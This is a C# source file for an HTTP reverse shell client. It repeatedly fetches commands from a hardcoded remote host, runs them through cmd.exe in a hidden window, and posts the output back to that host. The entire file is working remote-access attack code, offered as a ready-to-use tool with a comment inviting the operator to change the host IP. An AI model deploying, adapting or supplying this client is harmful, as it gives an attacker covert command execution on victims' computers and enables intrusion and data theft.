using System;
using System.IO;
using System.Net;
using System.Text;
using System.Text.RegularExpressions;
using System.Diagnostics;
using System.Management.Automation;
using System.Collections.ObjectModel;

namespace HTTPRevShell_Client
{
    class Program
    {
        static void Main(string[] args)
        {
            string host = "10.200.32.131"; // change the host ip
            string url = String.Concat("http://",host,"/");
            string location = Directory.GetCurrentDirectory();

            while(true)
            {
                String cmd = Get(url, location);
                if (cmd == "terminate")
                {
                    break;
                }
                else if (cmd.StartsWith("cd ")) 
                {
                    location = ChangeLocation(cmd, location, url);
                }
                else
                {
                    (string output, string error) = RunCMD(cmd, location);

                    output = (error.Length != 0) ? String.Concat("#!#", error) : output;

                    Post(url, output);
                }
            }
        }

        // Run CMD Command
        public static (string, string) RunCMD(string cmd, string location)
        {
            Process process = new Process();
            process.StartInfo.FileName = "cmd.exe";
            process.StartInfo.RedirectStandardInput = true;
            process.StartInfo.RedirectStandardOutput = true;
            process.StartInfo.RedirectStandardError = true;
            process.StartInfo.CreateNoWindow = true;
            process.StartInfo.UseShellExecute = false;
            process.StartInfo.WorkingDirectory = IsRoot(location);
            process.StartInfo.Arguments = string.Concat("/C ", cmd);
            process.Start();
            process.WaitForExit();
            string output = process.StandardOutput.ReadToEnd();
            string error = process.StandardError.ReadToEnd();
            process.Close();

            return (output, error);
        }

        // Check Root Dir
        public static string IsRoot(string location)
        {
            if (location.Length <3 && Regex.IsMatch(location, @"[A-Za-z]{1}:"))
            {
                return String.Concat(location, "\\");
            }
            return location;
        }

        // Change directory
        public static string ChangeLocation(string cmd, string location, string url)
        {
            string bkp = location;
            cmd = cmd.Substring(3);
            cmd.Replace("\"","");

            if (Regex.IsMatch(cmd, @"(\.\.(\\)*)+(\s)?")) // cmd == ".."
            {
                int times = Regex.Matches(cmd, @"\.\.").Count;
                string[] splitted = location.Split(Path.DirectorySeparatorChar);
                location = "";

                if (times >= splitted.Length) times = splitted.Length - 1;

                for (int i = 0; i < splitted.Length - times; i++)
                {
                    location += splitted[i] + Path.DirectorySeparatorChar;
                }

                location = location.Substring(0, location.Length - 1);
            }
            else
            {
                location = cmd;
                if (!Directory.Exists(location))
                {
                    location = String.Concat(bkp,"\\",cmd);
                }
            }

            if (Directory.Exists(location))
            {
                return location;
            }
            else
            {
                Post(url, "#!#Directory does not exist");
                return bkp;
            }
        }

        // HTTP Get Request
        public static string Get(string uri, string location)
        {
            HttpWebRequest request = (HttpWebRequest) WebRequest.Create(uri);
            request.Headers.Add("Current-Location", location);
            request.AutomaticDecompression = DecompressionMethods.GZip | DecompressionMethods.Deflate;

            using (HttpWebResponse response = (HttpWebResponse) request.GetResponse())
            using (Stream stream = response.GetResponseStream())
            using (StreamReader reader = new StreamReader(stream))
            {
                return reader.ReadToEnd();
            }
        }

        // HTTP Post Request
        public static string Post(string uri, string data, string contentType = "text/html", string method = "POST")
        {
            byte[] dataBytes = Encoding.UTF8.GetBytes(data);

            HttpWebRequest request = (HttpWebRequest)WebRequest.Create(uri);
            request.AutomaticDecompression = DecompressionMethods.GZip | DecompressionMethods.Deflate;
            request.ContentLength = dataBytes.Length;
            request.ContentType = contentType;
            request.Method = method;
            

            using (Stream requestBody = request.GetRequestStream())
            {
                requestBody.Write(dataBytes, 0, dataBytes.Length);
            }

            using (HttpWebResponse response = (HttpWebResponse)request.GetResponse())
            using (Stream stream = response.GetResponseStream())
            using (StreamReader reader = new StreamReader(stream))
            {
                return reader.ReadToEnd();
            }
        }
    }
}
